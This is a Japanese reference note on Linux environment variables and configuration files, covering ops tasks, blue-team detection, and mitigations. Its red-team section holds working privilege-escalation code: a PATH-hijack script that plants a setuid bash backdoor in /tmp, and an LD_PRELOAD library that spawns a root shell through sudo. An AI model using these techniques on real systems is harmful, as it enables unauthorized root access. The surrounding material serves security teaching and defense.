# OS  - Linux - environment_and_config - Linux 環境変数と設定ファイル

## 概要

Linuxシステムでは、環境変数と設定ファイルがシステムの動作、アプリケーションの実行、ユーザーエクスペリエンスの根幹をなしています。環境変数はシェルセッションやプロセスに動的な情報を提供し、設定ファイルはサービスやアプリケーションの永続的な設定を定義します。これらの要素を理解することは、インフラ構築、セキュリティ監視、ペネトレーションテストのすべての側面で不可欠です。

## 主要な概念と分類

環境変数と設定ファイルは、その影響範囲によってユーザー固有のものとシステム全体のものに大別されます。

| スコープ | 説明 | 主なファイル/変数 |
| :--- | :--- | :--- |
| **システムワイド** | システム上の全ユーザーに影響を与えるグローバルな設定。主に `/etc` ディレクトリ配下に格納される。 | `/etc/profile`, `/etc/environment`, `/etc/bashrc`, `PATH` (初期値) |
| **ユーザー固有** | 特定のユーザーセッションにのみ影響を与える設定。ユーザーのホームディレクトリ配下に格納される。 | `~/.bashrc`, `~/.profile`, `~/.bash_profile` |
| **環境変数 vs シェル変数** | 環境変数は現在のシェルから起動される子プロセスに引き継がれるが、シェル変数は現在のシェル内でのみ有効。`export` コマンドでシェル変数を環境変数に昇格できる。 | `export MY_VAR="value"` |

## 関連コマンド

環境変数や設定ファイルの確認・操作には以下のコマンドが頻繁に利用されます。

| コマンド | 説明 |
| :--- | :--- |
| `env`, `printenv` | 現在の環境変数を一覧表示します。 |
| `export` | シェル変数を環境変数として設定、または既存の環境変数を変更します。 |
| `unset` | 設定されている環境変数やシェル変数を削除します。 |
| `source` | シェルスクリプトや設定ファイルを現在のシェルセッションに読み込み、即座に反映させます。(`.` も同義) |
| `echo` | 変数の値を表示します。(`echo $PATH`) |
| `cat`, `less`, `more` | 設定ファイルの内容を表示します。 |
| `vim`, `nano` | 設定ファイルを編集します。 |

## 主要な環境変数

| 環境変数 | 説明 |
| :--- | :--- |
| ⭐ `PATH` | コマンド実行時に実行ファイルを探しに行くディレクトリのリスト。コロン `:` で区切られる。セキュリティ上、カレントディレクトリ `.` を含めることは非推奨。 |
| `HOME` | 現在のユーザーのホームディレクトリのパス。 |
| `USER` / `LOGNAME` | 現在ログインしているユーザー名。 |
| `SHELL` | ユーザーのデフォルトシェルのパス。通常は `/etc/passwd` から取得される。 |
| `LANG` / `LC_*` | ロケール設定。システムの言語、文字コード、日付形式などを定義する。 |
| ⭐ `LD_PRELOAD` | プログラム実行前に読み込む共有ライブラリを指定する。正規のデバッグ目的のほか、ルートキットや権限昇格に悪用されることがある。 |
| `PS1` | シェルのプロンプトの表示形式を定義する。 |
| `HTTP_PROXY` / `HTTPS_PROXY` | HTTP/HTTPS通信で使用するプロキシサーバーを指定する。 |

## 主要な設定ファイル

| ファイルパス | 説明 |
| :--- | :--- |
| **システムワイド設定** | |
| ⭐ `/etc/profile` | ログイン時に最初に読み込まれる全ユーザー共通の設定ファイル。主に `PATH` などの環境変数を設定する。 |
| `/etc/bashrc` | 全ユーザーの対話的bashシェルが起動するたびに読み込まれる。エイリアスやシェル関数などを定義する。 |
| `/etc/environment` | ディストリビューションによっては、ログイン時にPAMモジュールによって読み込まれるシステムワイドな環境変数設定ファイル。 |
| ⭐ `/etc/sudoers` | `sudo` コマンドのルールを定義する。誰がどのホストでどのコマンドをどのユーザーとして実行できるかを指定する。編集には `visudo` コマンドを使用することが強く推奨される。 |
| `/etc/passwd` | ユーザーアカウント情報を格納する。ユーザー名、UID、GID、ホームディレクトリ、デフォルトシェルなどが含まれる。 |
| `/etc/shadow` | ハッシュ化されたユーザーパスワードとパスワードポリシーを格納する。root権限でないと読み取れない。 |
| `/etc/hosts` | IPアドレスとホスト名の静的な対応関係を定義する。DNSより先に参照される。 |
| `/etc/resolv.conf` | DNSリゾルバ（ネームサーバー）のIPアドレスを指定する。 |
| `/etc/ssh/sshd_config` | SSHサーバー（sshd）のグローバルな設定ファイル。 |
| **ユーザー固有設定** | |
| ⭐ `~/.bash_profile` | ユーザーが**ログイン**する際に一度だけ読み込まれる。環境変数の設定に適している。 |
| ⭐ `~/.bashrc` | ユーザーが対話的な**シェルを起動する**たびに読み込まれる。エイリアスやシェル関数の設定に適している。 |
| `~/.profile` | `~/.bash_profile` がない場合に読み込まれることがある。他のシェルとの互換性のために存在する。 |
| `~/.ssh/config` | SSHクライアントの接続先ホストごとの設定を定義する。 |

## シナリオ別活用例

### 1. インフラ構築・運用視点

* **タスク**: カスタムアプリケーション `/opt/myapp/bin` をどの場所からでも実行できるようにする。
* **解説**: 全ユーザーの `PATH` 環境変数にカスタムパスを追加するため、`/etc/profile.d/` 配下に設定ファイルを作成する。
* **例**:

```bash
# /etc/profile.d/custom_path.sh を作成
echo 'export PATH=$PATH:/opt/myapp/bin' | sudo tee /etc/profile.d/custom_path.sh
# 次回ログイン時から全ユーザーに適用される
```

* **タスク**: gitリポジトリ操作時に毎回SSH鍵のパスフレーズ入力を省略する。
* **解説**: `ssh-agent` を利用し、ログイン時に自動的に鍵を登録する設定を `~/.bash_profile` に記述する。
* **例**:

```bash
# ~/.bash_profile に追記
if [ -z "$SSH_AUTH_SOCK" ]; then
	 # ssh-agentを起動
	 eval `ssh-agent`
	 # ssh-addで秘密鍵を登録
	 ssh-add ~/.ssh/id_rsa
fi
```

### 2. ブルーチーム視点

* **タスク**: 不審なライブラリが読み込まれていないか確認する。
* **解説**: `LD_PRELOAD` 環境変数が設定されているプロセスを調査する。これはルートキットが自身の存在を隠蔽するためによく利用する手法である。
* **例**:

```bash
# /proc以下の全プロセスの環境変数をチェックし、LD_PRELOADが設定されているものを探す
sudo grep -l -r "LD_PRELOAD" /proc/*/environ 2>/dev/null | xargs -I{} sudo strings {} | grep "LD_PRELOAD"
```

* **タスク**: 権限昇格に繋がりうる設定不備がないか `/etc/sudoers` を監査する。
* **解説**: `sudo -l` で現在のユーザーの権限を確認する。また、`NOPASSWD` オプションが不必要に付与されていないか、エディタや特定のコマンドが `sudo` 権限で実行可能になっていないかを確認する。
* **例**:

```bash
# 現在のユーザーが付与されているsudo権限を確認
sudo -l

# 全ユーザーの権限をリストアップ (root権限が必要)
sudo cat /etc/sudoers /etc/sudoers.d/* | grep -vE '^#|^$'
```

### 3. レッドチーム視点

* **タスク**: `PATH` の乗っ取りによるコマンドハイジャック。
* **解説**: `PATH` 環境変数の先頭に書き込み可能なディレクトリ（例: `/tmp`）を追加する。そのディレクトリに `ls` や `cat` といった一般的なコマンドと同名の悪性スクリプトを配置することで、ユーザーが意図せず悪性スクリプトを実行するように仕向ける。
* **例**:

```bash
# PATHの先頭に /tmp を追加
export PATH=/tmp:$PATH

# /tmp に悪性の "ls" スクリプトを配置
echo 'cp /bin/bash /tmp/backdoor; chmod u+s /tmp/backdoor' > /tmp/ls
chmod +x /tmp/ls

# ターゲットユーザーが "ls" を実行すると、バックドアが作成される
```

* **タスク**: `LD_PRELOAD` を利用した権限昇格。
* **解説**: `sudo` 実行時に現在の環境変数を引き継ぐ設定 (`env_keep`) がされている場合、`LD_PRELOAD` を使って任意の共有ライブラリをroot権限で実行させることで権限昇格が可能になる。
* **参照**: `https://gtfobins.github.io/gtfobins/sudo/`
* **例**:

```c
// Cコード (preload.c) を作成
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
		unsetenv("LD_PRELOAD");
		setuid(0);
		setgid(0);
		system("/bin/bash");
}
```

```bash
# コンパイルして共有ライブラリを作成
gcc -fPIC -shared -o /tmp/preload.so /path/to/preload.c -nostartfiles

# sudo -l で env_keep に LD_PRELOAD が含まれていることを確認後、実行
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find
```

## エラーメッセージとトラブルシューティング

1. **エラーメッセージ**: `bash: <command>: command not found`
		* **考えられる原因**:
				* 実行したいコマンドのパスが `PATH` 環境変数に含まれていない。
				* コマンドがシステムにインストールされていない。
				* タイプミス。
		* **解決策**:
				* `echo $PATH` で現在の `PATH` を確認する。
				* `which <command>` や `find / -name <command> 2>/dev/null` でコマンドの場所を探し、`PATH` に追加するかフルパスで実行する。
				* パッケージマネージャ (`apt`, `yum` 等) でコマンドをインストールする。

2. **現象**: 設定ファイル (`~/.bashrc` など) を変更したが、反映されない。
		* **考えられる原因**:
				* 設定ファイルが再読み込みされていない。
				* 編集したファイルが現在のシェルセッションで読み込まれるべきファイルではない (例: ログインシェルで `~/.bashrc` のみを編集した)。
		* **解決策**:
				* `source ~/.bashrc` のように `source` コマンドでファイルを再読み込みする。
				* 新しいシェルセッションを開始する（ターミナルを開き直す）。
				* ログインシェルと非ログインシェルの違いを理解し、適切なファイル (`~/.bash_profile` や `~/.profile` など) に設定を記述する。
				* 一般的な設定は `~/.bashrc` に書き、`~/.bash_profile` から `~/.bashrc` を読み込むように設定するのが良いプラクティス。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **機密情報の平文保存**: 設定ファイル内にパスワードやAPIキーがハードコードされている場合、ファイルが読み取られると情報が漏洩する。(`~/.bash_history`, `docker-compose.yml`, `~/.aws/credentials` 等)
* **不適切なパーミッション**: `~/.ssh` ディレクトリや秘密鍵、システム設定ファイルが誰でも書き込める状態になっていると、第三者による改竄や不正アクセスの原因となる。
* **`sudoers` の設定不備**: `(ALL) NOPASSWD: ALL` のような過剰な権限付与や、特定のコマンドにワイルドカードを使用することで、意図しないコマンド実行による権限昇格が可能になる。

### GTFOBins / LOLBAS における利用例

多くの標準Linuxコマンドは設定ファイルの読み書きや環境変数の操作に利用できるため、間接的に権限昇格や永続化に悪用される可能性がある。

* **機能**: `File Write`, `File Read`, `Sudo`, `Privilege Escalation`
* **解説**: 例えば、`env` コマンド自体も、`sudo (env)` のように特定の条件下で任意のプログラムをrootとして実行するために利用できる。
* **参照**: `https://gtfobins.github.io/gtfobins/env/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**:
	* **最小権限の原則**: ユーザーやプロセスには必要最小限の権限のみを与える。
	* **パーミッションの厳格化**: `chmod` や `chown` を用いて、重要な設定ファイルへのアクセスを厳しく制限する。
	* **シークレット管理**: パスワードやAPIキーはVaultなどの専用ツールで管理し、環境変数や設定ファイルに直接書き込まない。
	* **`visudo` の強制**: `/etc/sudoers` の編集は必ず `visudo` を使用し、構文エラーを防ぐ。
* **Detection (検知)**:
	* **ファイル整合性監視 (FIM)**: `AIDE` や `Tripwire`, `Wazuh` などのツールを使用し、`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `~/.bashrc` などの重要な設定ファイルの変更を監視・検知する。
	* **監査ログ**: `auditd` を使用して、重要なファイルへのアクセスや変更イベントを記録し、定期的にレビューする。
	* **不審な環境変数の監視**: 特に `LD_PRELOAD` が設定されたプロセス実行を監視する。

## 注意点・補足

* **シェルの種類**: ここでの説明は主に`bash`を前提としているが、`zsh` (`.zshrc`, `.zprofile`) や `fish` など、他のシェルでは設定ファイルの名前や読み込み順序が異なる。
* **読み込み順序**: ログインシェルでは `/etc/profile` -> `~/.bash_profile` -> `~/.bash_login` -> `~/.profile` の順で最初に見つかったものが読み込まれることが多い。対話的非ログインシェルでは `~/.bashrc` が読み込まれる。この挙動はディストリビューションによって若干異なる場合がある。
* **`profile.d`**: 多くのシステムでは、`/etc/profile` から `/etc/profile.d/*.sh` を読み込むよう設定されている。システムワイドな設定を追加する場合は、`/etc/profile` を直接編集するのではなく、このディレクトリに新しい `.sh` ファイルを配置するのが推奨される。
